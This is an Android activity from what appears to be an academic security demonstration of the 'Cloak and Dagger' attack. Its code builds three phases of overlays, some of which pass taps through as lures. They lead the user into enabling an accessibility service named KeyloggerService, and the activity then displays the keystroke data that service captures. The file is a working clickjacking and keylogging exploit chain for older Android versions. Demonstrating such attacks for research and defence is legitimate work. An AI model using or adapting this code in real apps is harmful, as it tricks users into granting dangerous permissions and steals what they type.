package pl.edu.agh.sarna.cloak_and_dagger;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

import butterknife.ButterKnife;
import butterknife.InjectView;
import butterknife.OnClick;
import pl.edu.agh.sarna.R;

import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_NAME;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.INTENT_VALUE;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.LOG_TAG;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.REQUEST_CODE_ENABLE_ACCESSIBILITY_SERVICE;
import static pl.edu.agh.sarna.cloak_and_dagger.Constants.REQUEST_CODE_ENABLE_OVERLAY_PERMISSION;

public class CloakAndDaggerActivity extends AppCompatActivity {

    @InjectView(R.id.captured_data_view)
    TextView capturedDataView;

    @InjectView(R.id.start_button)
    Button startButton;

    @OnClick(R.id.start_button)
    void buttonOnClick() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.M) {
            ensureAccessibilityService();
        } else {
            capturedDataView.setText("Ta procedura wymaga Androida w wersji 6.0 lub starszej.");
        }
    }

    private OverlayManager overlayManager;

    private List<String> capturedData = new ArrayList<>();

    private final BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String incomingData = intent.getStringExtra(INTENT_VALUE);
            capturedData.add(incomingData);
            String capturedDataString = TextUtils.join("\n", capturedData);
            capturedDataView.setText(capturedDataString);
        }
    };

    private void ensureAccessibilityService() {
        if (KeyloggerService.isRunning(this)) {
            Log.d(LOG_TAG, "Accessibility service is running.");
            startButton.setEnabled(false);
            overlayManager.clear();
        } else {
            final Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, REQUEST_CODE_ENABLE_ACCESSIBILITY_SERVICE);
            startOverlayProcedure();
        }
    }

    @SuppressLint("NewApi")
    private void ensureOverlayPermission() {
        if (Settings.canDrawOverlays(this)) {
            Log.d(LOG_TAG, "Overlay permission granted.");
        } else {
            final Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            startActivityForResult(intent, REQUEST_CODE_ENABLE_OVERLAY_PERMISSION);
        }
    }

    private void startOverlayProcedure() {
        // PHASE_1_BEGIN
        overlayManager.clear();
        overlayManager.addTouchableOverlay(R.layout.overlay_phase_1_label, 0, 0, overlayManager
                .getDisplayWidth(), 634, null);
        overlayManager.addNotTouchableOverlay(R.layout.overlay_lure_click, 0, 634, overlayManager
                .getDisplayWidth(), 200);
        overlayManager.addTouchableOverlay(R.layout.overlay_button_next, 0, 834, overlayManager
                .getDisplayWidth(), 900, new Runnable() {
            @Override
            public void run() {
                // PHASE_2_BEGIN
                overlayManager.clearDelayed(200);
                overlayManager.addTouchableOverlay(R.layout.overlay_phase_2_label, 0, 0, overlayManager
                        .getDisplayWidth(), 147, null);
                overlayManager.addTouchableOverlay(R.layout.overlay_padding, 0, 147, 890, 147, null);
                overlayManager.addNotTouchableOverlay(R.layout.overlay_lure_click, 890, 147,
                        overlayManager.getDisplayWidth() - 890, 147);
                overlayManager.addTouchableOverlay(R.layout.overlay_button_next, 0, 294, overlayManager
                        .getDisplayWidth(), 1441, new Runnable() {
                    @Override
                    public void run() {
                        // PHASE_3_BEGIN
                        overlayManager.clearDelayed(200);
                        overlayManager.addTouchableOverlay(R.layout.overlay_phase_3_label, 0, 0,
                                overlayManager.getDisplayWidth(), 1230, null);
                        overlayManager.addTouchableOverlay(R.layout.overlay_padding, 0, 1230, 830,
                                100, null);
                        overlayManager.addTouchableOverlay(R.layout.overlay_padding, 965, 1230, 115,
                                100, null);
                        overlayManager.addTouchableOverlay(R.layout.overlay_button_next, 0, 1330,
                                overlayManager.getDisplayWidth(), 400, new Runnable() {
                                    @Override
                                    public void run() {
                                        Intent intent = new Intent(CloakAndDaggerActivity.this,
                                                CloakAndDaggerActivity.class);
                                        startActivity(intent);
                                        overlayManager.clear();
                                    }
                                });
                        // PHASE_3_END
                    }
                });
                // PHASE_2_END
            }
        });
        // PHASE_1_END
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case REQUEST_CODE_ENABLE_ACCESSIBILITY_SERVICE:
                ensureAccessibilityService();
                break;
            case REQUEST_CODE_ENABLE_OVERLAY_PERMISSION:
                ensureOverlayPermission();
                break;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_cloak_and_dagger);
        overlayManager = new OverlayManager(this);
        ButterKnife.inject(this);
        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, new IntentFilter(INTENT_NAME));
    }

}